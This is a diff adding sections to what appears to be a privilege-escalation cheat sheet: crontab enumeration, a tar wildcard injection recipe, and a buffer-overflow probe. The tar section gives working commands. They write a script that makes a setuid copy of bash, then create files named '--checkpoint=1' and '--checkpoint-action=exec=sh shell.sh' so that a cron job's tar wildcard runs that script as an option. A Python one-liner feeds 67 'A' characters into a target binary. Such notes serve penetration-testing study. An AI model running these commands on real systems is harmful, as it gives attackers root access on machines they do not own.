@@ -284,12 +284,30 @@ use
 
 # Crontab
 
+## Enumeration
+
 ```bash
 cat /etc/crontab
 ```
 
 ```bash
 cd /etc/cron.d
+```
+
+## Tar Wildcard Injection
+
+```bash
+echo -e '#!/bin/bash \ncp /bin/bash /home/<USER_NAME>\nchmod +s /home/<USER_NAME>/bash' > shell.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+```
+
+# Buffer Overflow
+
+## Testing
+
+```bash
+(python -c 'print "A"*67') | <FILE_NAME>
 ```
 
 # Online Tools and Resources
